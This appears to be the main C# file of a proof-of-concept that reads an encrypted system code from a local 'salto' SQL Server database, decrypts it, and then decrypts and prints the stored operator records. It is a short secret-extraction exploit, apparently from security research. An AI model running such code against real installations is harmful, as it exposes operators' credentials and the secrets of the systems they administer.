using System;
using System.Data.SqlClient;
using System.Net.NetworkInformation;
using PoC;


class Program
{

    static void Main()
    {
        // change db connection string to match your database
        DBqueries bqueries = new DBqueries("Server=DESKTOP-RD27L3M\\SQLEXPRESS;Database=salto;Trusted_Connection=True;");
        
        
        string syscodeEnc = bqueries.getSysCodeFromDB();
        Console.WriteLine($"SysCode (stored in DB): {syscodeEnc}");

        string syscodeClear = CryptoUtils.db_to_syscode(syscodeEnc);
        Console.WriteLine($"SysCode (cleartex, 32bits): {syscodeClear}");

        List<Operator> OperatorData;
        OperatorData = bqueries.getOperatorDataFromDB();
        CryptoUtils.decipherOperatorList(OperatorData,syscodeEnc);
        foreach (Operator op in OperatorData){
            Console.WriteLine(op);
        }
        
    }
    
}


